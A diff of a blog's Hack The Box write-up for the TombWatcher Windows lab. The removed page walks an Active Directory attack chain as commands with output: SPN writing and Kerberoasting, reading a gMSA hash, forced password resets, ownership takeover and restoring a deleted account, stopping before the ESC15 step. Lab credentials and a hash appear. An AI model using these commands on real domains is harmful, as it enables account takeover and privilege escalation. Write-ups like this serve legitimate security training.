@@ -1,146 +1,389 @@
-<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>HTB: TombWatcher | kanyo's blog</title><meta property="og:title" content="HTB: TombWatcher | kanyo's blog"><meta name=twitter:title content="HTB: TombWatcher | kanyo's blog"><meta itemprop=name content="HTB: TombWatcher | kanyo's blog"><meta name=application-name content="HTB: TombWatcher | kanyo's blog"><meta property="og:site_name" content><meta name=description content="A Medium Windows box where a BloodHound ACL chain reaches john, Reanimate-Tombstones restores a deleted cert_admin into an OU where you have GenericAll, and ESC15 issues a domain admin cert via LDAPS Schannel."><meta itemprop=description content="A Medium Windows box where a BloodHound ACL chain reaches john, Reanimate-Tombstones restores a deleted cert_admin into an OU where you have GenericAll, and ESC15 issues a domain admin cert via LDAPS Schannel."><meta property="og:description" content="A Medium Windows box where a BloodHound ACL chain reaches john, Reanimate-Tombstones restores a deleted cert_admin into an OU where you have GenericAll, and ESC15 issues a domain admin cert via LDAPS Schannel."><meta name=twitter:description content="A Medium Windows box where a BloodHound ACL chain reaches john, Reanimate-Tombstones restores a deleted cert_admin into an OU where you have GenericAll, and ESC15 issues a domain admin cert via LDAPS Schannel."><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=https://chaelsoo.me/writeups/htb-tombwatcher/ title=English><meta name=generator content="Hugo 0.161.1"><meta property="og:url" content="https://chaelsoo.me/writeups/htb-tombwatcher/"><meta property="og:site_name" content="kanyo's blog"><meta property="og:title" content="HTB: TombWatcher"><meta property="og:description" content="A Medium Windows box where a BloodHound ACL chain reaches john, Reanimate-Tombstones restores a deleted cert_admin into an OU where you have GenericAll, and ESC15 issues a domain admin cert via LDAPS Schannel."><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2026-06-06T00:00:00+00:00"><meta property="article:modified_time" content="2026-06-06T00:00:00+00:00"><meta property="article:tag" content="Esc15"><meta property="article:tag" content="Acl-Abuse"><meta property="article:tag" content="Inheritance"><meta property="article:tag" content="Reanimate-Tombstone"><meta property="article:tag" content="Windows"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB: TombWatcher"><meta name=twitter:description content="A Medium Windows box where a BloodHound ACL chain reaches john, Reanimate-Tombstones restores a deleted cert_admin into an OU where you have GenericAll, and ESC15 issues a domain admin cert via LDAPS Schannel."><link rel=canonical href=https://chaelsoo.me/writeups/htb-tombwatcher/><link href=/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://chaelsoo.me/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://chaelsoo.me/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-</a><input type=checkbox id=menu-trigger class=menu-trigger>
-<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class=menu-link href=/blogs/>Blogs</a></li><li><a class="menu-link active" href=/writeups/>Writeups</a></li><li><a class=menu-link href=/about/>About</a></li><li><a class=menu-link href=https://notes.chaelsoo.me>Cheatsheet</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg>
-<svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>HTB: TombWatcher</h1><div class=post-meta><time datetime=2026-06-06T00:00:00+00:00 itemprop=datePublished>6 Jun 2026</time></div></header><img src=/images/writeups/htb-tombwatcher/htb-tombwatcher-pwned.png alt="HTB: TombWatcher" style="width:100%;border-radius:.5rem;margin:1.5rem 0"><div class=toc-container><button class=toc-toggle type=button onclick=toggleToc()>Table of Contents</button><div class=toc-content id=tocContent><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#acl-chain-to-john>ACL Chain to John</a><ul><li><a href=#1-writespn-on-alfred-then-kerberoast>1. WriteSPN on Alfred, then Kerberoast</a></li><li><a href=#2-alfred-adds-himself-to-infrastructure>2. Alfred Adds Himself to Infrastructure</a></li><li><a href=#3-read-ansible_devs-gmsa-password>3. Read ANSIBLE_DEV$&rsquo;s gMSA Password</a></li><li><a href=#4-forcechangepassword-on-sam>4. ForceChangePassword on Sam</a></li><li><a href=#5-writeowner-on-john>5. WriteOwner on John</a></li></ul></li><li><a href=#tombstone-reanimation>Tombstone Reanimation</a></li><li><a href=#esc15-via-cert_admin>ESC15 via cert_admin</a></li><li><a href=#references>References</a></li></ul></nav></div></div><div class=mini-toc id=miniToc><div class=mini-toc-header><div class=mini-toc-title>Contents</div><button class=mini-toc-minimize type=button onclick=toggleMiniToc() aria-label="Minimize TOC">
-<svg fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1 8a.5.5.0 01.5-.5h13a.5.5.0 010 1h-13A.5.5.0 011 8zM7.646 4.146a.5.5.0 01.708.0l2 2a.5.5.0 01-.708.708L8.5 5.707V11.5a.5.5.0 01-1 0V5.707L6.354 6.854a.5.5.0 11-.708-.708l2-2z"/></svg></button></div><div class=mini-toc-content id=miniTocContent></div></div><div class=page-content><p>Windows AD box with starting credentials. The box name is a hint you&rsquo;ll miss until it isn&rsquo;t. The first half is a clean BloodHound chain: five ACL hops from henry to john, each one mechanical. The second half is what makes this box worth remembering. John has a right most people have never used, Reanimate-Tombstones, and the ADCS OU he controls looks empty until you remember that AD doesn&rsquo;t actually delete objects immediately. The cert_admin account sitting in the deleted objects container has enrollment rights on a schema version 1 template, which is all you need for ESC15.</p><h2 id=recon>Recon</h2><p>10.129.232.167, domain <code>tombwatcher.htb</code>, DC hostname <code>DC01</code>. Standard AD stack, WinRM on 5985. Port 80 had the default IIS page.</p><p>Starting credentials: <code>henry:H3nry_987TGV!</code>. No interesting shares:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb <span class=nv>$DC</span> -u henry -p <span class=s1>&#39;H3nry_987TGV!&#39;</span> --shares
-</span></span><span class=line><span class=cl>SMB  DC01  <span class=o>[</span>+<span class=o>]</span> tombwatcher.htb<span class=se>\h</span>enry:H3nry_987TGV!
-</span></span><span class=line><span class=cl>SMB  DC01  Share      Permissions
-</span></span><span class=line><span class=cl>SMB  DC01  -----      -----------
-</span></span><span class=line><span class=cl>SMB  DC01  ADMIN$
-</span></span><span class=line><span class=cl>SMB  DC01  C$
-</span></span><span class=line><span class=cl>SMB  DC01  IPC$       READ
-</span></span><span class=line><span class=cl>SMB  DC01  NETLOGON   READ
-</span></span><span class=line><span class=cl>SMB  DC01  SYSVOL     READ
-</span></span></code></pre></div><p>Collected BloodHound data straight away:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap <span class=nv>$DC</span> -u henry -p <span class=s1>&#39;H3nry_987TGV!&#39;</span> --bloodhound -c All --dns-server <span class=nv>$DC</span>
-</span></span></code></pre></div><h2 id=acl-chain-to-john>ACL Chain to John</h2><p>BloodHound showed the full picture immediately:</p><p><img src=/images/writeups/htb-tombwatcher/bloodhound-full-chain.png alt="BloodHound graph showing HENRY has WriteSPN on ALFRED, Alfred can AddSelf to INFRASTRUCTURE group, INFRASTRUCTURE has ReadGMSAPassword on ANSIBLE_DEV$, ANSIBLE_DEV$ has ForceChangePassword on SAM, SAM has WriteOwner on JOHN, and JOHN has GenericAll on the ADCS OU"></p><p>That&rsquo;s one hell of a chain. Five hops to john, and GenericAll on the ADCS OU waiting at the end. The steps are each one command, let&rsquo;s get through them.</p><h3 id=1-writespn-on-alfred-then-kerberoast>1. WriteSPN on Alfred, then Kerberoast</h3><p>WriteSPN lets you add a Service Principal Name to any account you have that right over. An account with a SPN becomes kerberoastable. The KDC will issue a TGS ticket encrypted with that account&rsquo;s NT hash. No SPN needs to exist beforehand; write a fake one and it&rsquo;s immediately roastable:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -u henry -p <span class=s1>&#39;H3nry_987TGV!&#39;</span> -d tombwatcher.htb --host <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=nb>set</span> object Alfred servicePrincipalName -v <span class=s2>&#34;fake/spn.tombwatcher.htb&#34;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Alfred<span class=err>&#39;</span>s servicePrincipalName has been updated
-</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>faketime -f <span class=s1>&#39;+4h&#39;</span> GetUserSPNs.py tombwatcher.htb/henry:<span class=s1>&#39;H3nry_987TGV!&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -dc-ip <span class=nv>$DC</span> -request
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>ServicePrincipalName      Name    MemberOf  PasswordLastSet             LastLogon  Delegation
-</span></span><span class=line><span class=cl>------------------------  ------  --------  --------------------------  ---------  ----------
-</span></span><span class=line><span class=cl>fake/spn.tombwatcher.htb  Alfred            2025-05-12 16:17:03.526670  &lt;never&gt;
-</span></span></code></pre></div><p><em>The <code>faketime +4h</code> is needed because of a four-hour clock skew between my machine and the DC. Kerberos rejects tickets more than five minutes off.</em></p><p>Cracked: <code>alfred:basketball</code>.</p><h3 id=2-alfred-adds-himself-to-infrastructure>2. Alfred Adds Himself to Infrastructure</h3><p>AddSelf is a specific ACL right that lets an account add itself to a group without needing WriteMember over other accounts:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -u alfred -p <span class=s1>&#39;basketball&#39;</span> -d tombwatcher.htb --host <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  add groupMember <span class=s2>&#34;Infrastructure&#34;</span> alfred
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> alfred added to Infrastructure
-</span></span></code></pre></div><h3 id=3-read-ansible_devs-gmsa-password>3. Read ANSIBLE_DEV$&rsquo;s gMSA Password</h3><p>Group Managed Service Accounts have passwords the DC auto-rotates on a schedule. The current NT hash is stored as the <code>msDS-ManagedPassword</code> attribute on the computer object, readable over LDAP by members of the designated group, here Infrastructure:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -u alfred -p <span class=s1>&#39;basketball&#39;</span> -d tombwatcher.htb --host <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  get object <span class=s1>&#39;ansible_dev$&#39;</span> --attr msDS-ManagedPassword
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>distinguishedName: <span class=nv>CN</span><span class=o>=</span>ansible_dev,CN<span class=o>=</span>Managed Service Accounts,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb
-</span></span><span class=line><span class=cl>msDS-ManagedPassword.NT: cba56cd2df7d642f622e2a59956f6d47
-</span></span><span class=line><span class=cl>msDS-ManagedPassword.B64ENCODED: mfN6zpVwyTpoirhbjkl6QrRJVzGohXxRem98/IxOBHXUQ85SDNU5VgvC3uXsQB/C6pbTxd7aibpSAqrOM1eSd...
-</span></span></code></pre></div><h3 id=4-forcechangepassword-on-sam>4. ForceChangePassword on Sam</h3><p>ANSIBLE_DEV$ has this right over Sam, reset the password without knowing the current one:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -u <span class=s1>&#39;ansible_dev$&#39;</span> -p <span class=s1>&#39;:cba56cd2df7d642f622e2a59956f6d47&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -d tombwatcher.htb --host <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=nb>set</span> password sam <span class=s1>&#39;Kanyo123!&#39;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Password changed successfully!
-</span></span></code></pre></div><h3 id=5-writeowner-on-john>5. WriteOwner on John</h3><p>This is a three-step abuse. Sam has WriteOwner over John&rsquo;s object. Ownership in AD controls the DACL. The owner can modify permission entries on the object. So: take ownership, grant yourself GenericAll, reset the password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -u sam -p <span class=s1>&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=nb>set</span> owner <span class=s1>&#39;CN=john,CN=Users,DC=tombwatcher,DC=htb&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>             <span class=s1>&#39;CN=sam,CN=Users,DC=tombwatcher,DC=htb&#39;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by
-</span></span><span class=line><span class=cl>    <span class=nv>CN</span><span class=o>=</span>sam,CN<span class=o>=</span>Users,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb on <span class=nv>CN</span><span class=o>=</span>john,CN<span class=o>=</span>Users,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb
-</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -u sam -p <span class=s1>&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  add genericAll <span class=s1>&#39;CN=john,CN=Users,DC=tombwatcher,DC=htb&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>                 <span class=s1>&#39;CN=sam,CN=Users,DC=tombwatcher,DC=htb&#39;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=nv>CN</span><span class=o>=</span>sam,CN<span class=o>=</span>Users,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb has now GenericAll on
-</span></span><span class=line><span class=cl>    <span class=nv>CN</span><span class=o>=</span>john,CN<span class=o>=</span>Users,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb
-</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -u sam -p <span class=s1>&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=nb>set</span> password john <span class=s1>&#39;Kanyo123!&#39;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Password changed successfully!
-</span></span></code></pre></div><p>John is in Remote Management Users. WinRM works, user flag on his desktop.</p><p><img src=/images/writeups/htb-tombwatcher/bloodhound-john-remote-management.png alt="BloodHound graph showing JOHN@TOMBWATCHER.HTB is MemberOf Remote Management Users and Domain Users groups"></p><h2 id=tombstone-reanimation>Tombstone Reanimation</h2><p>We&rsquo;ve reached the ADCS OU, which is what the GenericAll was pointing at. First thing I did was check what&rsquo;s actually in it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -D <span class=s2>&#34;john@tombwatcher.htb&#34;</span> -w <span class=s1>&#39;Kanyo123!&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -b <span class=s1>&#39;OU=ADCS,DC=tombwatcher,DC=htb&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=s1>&#39;(objectClass=*)&#39;</span> dn objectClass
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># ADCS, tombwatcher.htb</span>
-</span></span><span class=line><span class=cl>dn: <span class=nv>OU</span><span class=o>=</span>ADCS,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb
-</span></span><span class=line><span class=cl>objectClass: top
-</span></span><span class=line><span class=cl>objectClass: organizationalUnit
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># numEntries: 1</span>
-</span></span></code></pre></div><p>Empty. GenericAll over an empty OU is useless for object takeover. I ran PowerView to see what other rights john might have that BloodHound didn&rsquo;t surface:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Find-InterestingDomainAcl -ResolveGUIDs <span class=p>|</span> Where-Object <span class=o>{</span>
-</span></span><span class=line><span class=cl>    <span class=nv>$_</span>.IdentityReferenceName -match <span class=s2>&#34;john&#34;</span>
-</span></span><span class=line><span class=cl><span class=o>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>ObjectDN                : <span class=nv>DC</span><span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb
-</span></span><span class=line><span class=cl>AceQualifier            : AccessAllowed
-</span></span><span class=line><span class=cl>ActiveDirectoryRights   : ExtendedRight
-</span></span><span class=line><span class=cl>ObjectAceType           : Reanimate-Tombstones
-</span></span><span class=line><span class=cl>AceFlags                : None
-</span></span><span class=line><span class=cl>AceType                 : AccessAllowedObject
-</span></span><span class=line><span class=cl>InheritanceFlags        : None
-</span></span><span class=line><span class=cl>IdentityReferenceName   : john
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>ObjectDN                : <span class=nv>OU</span><span class=o>=</span>ADCS,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb
-</span></span><span class=line><span class=cl>AceQualifier            : AccessAllowed
-</span></span><span class=line><span class=cl>ActiveDirectoryRights   : GenericAll
-</span></span><span class=line><span class=cl>ObjectAceType           : None
-</span></span><span class=line><span class=cl>AceFlags                : ContainerInherit
-</span></span><span class=line><span class=cl>AceType                 : AccessAllowed
-</span></span><span class=line><span class=cl>InheritanceFlags        : ContainerInherit
-</span></span><span class=line><span class=cl>IdentityReferenceName   : john
-</span></span></code></pre></div><p>Two rights: Reanimate-Tombstones on the domain root, and GenericAll with <code>ContainerInherit</code> on the ADCS OU. That combination is the entire box.</p><p>When an AD object is deleted, it doesn&rsquo;t disappear. It becomes a tombstone:</p><p><img src=/images/writeups/htb-tombwatcher/ad-tombstone-lifecycle-diagram.png alt="Diagram showing AD object lifecycle: Live Object becomes Logically Deleted Object (restorable during msDS-deletedObjectLifetime window), then becomes Recycled Object (cannot restore), then Physically Deleted Object after tombstoneLifetime expires"></p><p>The object is moved to <code>CN=Deleted Objects</code>, most attributes are stripped, and <code>isDeleted=TRUE</code> is set. The SID, GUID, <code>lastKnownParent</code>, and a handful of other attributes survive intact. For a configurable retention window (default 180 days), the object is recoverable. Reanimate-Tombstones is the extended right that lets you pull it back, clearing <code>isDeleted</code>, moving it back to <code>lastKnownParent</code>, and restoring it with its original SID.</p><p>Querying the deleted objects container with the <code>1.2.840.113556.1.4.417</code> control (which instructs the DC to include deleted objects in the response):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -D <span class=s2>&#34;john@tombwatcher.htb&#34;</span> -w <span class=s1>&#39;Kanyo123!&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -b <span class=s1>&#39;DC=tombwatcher,DC=htb&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -E <span class=s1>&#39;!1.2.840.113556.1.4.417&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=s1>&#39;(isDeleted=TRUE)&#39;</span> dn sAMAccountName objectClass lastKnownParent memberOf
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># cert_admin DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3</span>
-</span></span><span class=line><span class=cl>dn: <span class=nv>CN</span><span class=o>=</span>cert_admin<span class=se>\0</span>ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,
-</span></span><span class=line><span class=cl>    <span class=nv>CN</span><span class=o>=</span>Deleted Objects,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb
-</span></span><span class=line><span class=cl>objectClass: user
-</span></span><span class=line><span class=cl>sAMAccountName: cert_admin
-</span></span><span class=line><span class=cl>lastKnownParent: <span class=nv>OU</span><span class=o>=</span>ADCS,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb
-</span></span></code></pre></div><p>The ADCS OU was never actually empty. <code>cert_admin</code> used to live in it and was deleted. Restoring it puts it back under <code>OU=ADCS</code>, and because John&rsquo;s GenericAll ACE has <code>ContainerInherit</code>, he automatically gets GenericAll on cert_admin the moment it lands there.</p><p>I restored it by sAMAccountName first:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -u john -p <span class=s1>&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=nb>set</span> restore <span class=s1>&#39;cert_admin&#39;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> cert_admin has been restored successfully under
-</span></span><span class=line><span class=cl>    <span class=nv>CN</span><span class=o>=</span>cert_admin,OU<span class=o>=</span>ADCS,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb
-</span></span></code></pre></div><p>Then ran certipy to enumerate certificate templates and found the WebServer template had an enrollment rights entry with an unresolved SID:</p><pre tabindex=0><code>Enrollment Rights : TOMBWATCHER.HTB\Domain Admins
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HTB: TombWatcher | kanyo&#39;s blog</title>
+<meta property="og:title" content="HTB: TombWatcher | kanyo&#39;s blog" />
+<meta name="twitter:title" content="HTB: TombWatcher | kanyo&#39;s blog" />
+<meta itemprop="name" content="HTB: TombWatcher | kanyo&#39;s blog" />
+<meta name="application-name" content="HTB: TombWatcher | kanyo&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="A Medium Windows box where a BloodHound ACL chain reaches john, Reanimate-Tombstones restores a deleted cert_admin into an OU where you have GenericAll, and ESC15 issues a domain admin cert via LDAPS Schannel.">
+<meta itemprop="description" content="A Medium Windows box where a BloodHound ACL chain reaches john, Reanimate-Tombstones restores a deleted cert_admin into an OU where you have GenericAll, and ESC15 issues a domain admin cert via LDAPS Schannel." />
+<meta property="og:description" content="A Medium Windows box where a BloodHound ACL chain reaches john, Reanimate-Tombstones restores a deleted cert_admin into an OU where you have GenericAll, and ESC15 issues a domain admin cert via LDAPS Schannel." />
+<meta name="twitter:description" content="A Medium Windows box where a BloodHound ACL chain reaches john, Reanimate-Tombstones restores a deleted cert_admin into an OU where you have GenericAll, and ESC15 issues a domain admin cert via LDAPS Schannel." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-tombwatcher/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="http://localhost:1313/writeups/htb-tombwatcher/">
+  <meta property="og:site_name" content="kanyo&#39;s blog">
+  <meta property="og:title" content="HTB: TombWatcher">
+  <meta property="og:description" content="A Medium Windows box where a BloodHound ACL chain reaches john, Reanimate-Tombstones restores a deleted cert_admin into an OU where you have GenericAll, and ESC15 issues a domain admin cert via LDAPS Schannel.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-06T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-06T00:00:00+00:00">
+    <meta property="article:tag" content="Esc15">
+    <meta property="article:tag" content="Acl-Abuse">
+    <meta property="article:tag" content="Inheritance">
+    <meta property="article:tag" content="Reanimate-Tombstone">
+    <meta property="article:tag" content="Windows">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: TombWatcher">
+  <meta name="twitter:description" content="A Medium Windows box where a BloodHound ACL chain reaches john, Reanimate-Tombstones restores a deleted cert_admin into an OU where you have GenericAll, and ESC15 issues a domain admin cert via LDAPS Schannel.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/writeups/htb-tombwatcher/">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
